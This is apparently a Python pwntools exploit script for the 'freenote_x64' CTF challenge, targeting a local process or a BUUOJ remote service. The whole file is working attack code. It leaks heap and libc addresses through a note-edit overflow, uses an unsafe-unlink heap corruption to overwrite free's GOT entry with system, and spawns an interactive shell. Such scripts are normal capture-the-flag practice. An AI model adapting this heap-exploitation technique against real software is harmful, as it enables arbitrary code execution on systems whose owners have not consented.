import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./freenote_x64')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./freenote_x64')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',27715)
			elf=ELF('./freenote_x64')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		
		def add(a):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('Length of new note: ',str(len(a)))
			io.sendafter('Enter your note: ',a)

		def show():
			io.sendlineafter('Your choice: ','1')

		def edit(a,b):
			io.sendlineafter('Your choice: ','3')
			io.sendlineafter('Note number: ',str(a))
			io.sendlineafter('Length of note: ',str(len(b)))
			io.sendafter('Enter your note: ',b)

		def delete(a):
			io.sendlineafter('Your choice: ','4')
			io.sendlineafter('Note number: ',str(a))


		add('a'*0x80)
		add('a'*0x80)
		add('a'*0x80)
		add('a'*0x80)
		add('/bin/sh\x00'*0x10)
		
		delete(3)
		delete(1)
		edit(0,'a'*0x90)
		show()
		io.recvuntil('a'*0x90)
		heap_base=u64(io.recvuntil('\n',drop=True).ljust(8,'\x00'))-0x19d0
		edit(0,'a'*0x98)
		show()
		io.recvuntil('a'*0x98)
		libc_base=u64(io.recvuntil('\n',drop=True).ljust(8,'\x00'))-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		chunk_0=heap_base+0x30
		pay=p64(0)+p64(0x80)+p64(chunk_0-3*8)+p64(chunk_0-2*8)+'a'*(0x80-4*8)+p64(0x80)+p64(0x90)
		pay=pay.ljust(0x100,'a')
		edit(0,pay)
		delete(1)
		pay=(p64(2)+p64(1)+p64(8)+p64(elf.got['free'])+p64(1)+p64(0x100)+p64(libc.search('/bin/sh\x00').next()))
		pay=pay.ljust(0x100,'a')

		edit(0,pay)
		edit(0,p64(libc.sym['system']))
		delete(1)










		success('libc_base:'+hex(libc_base))
		success('heap_base:'+hex(heap_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue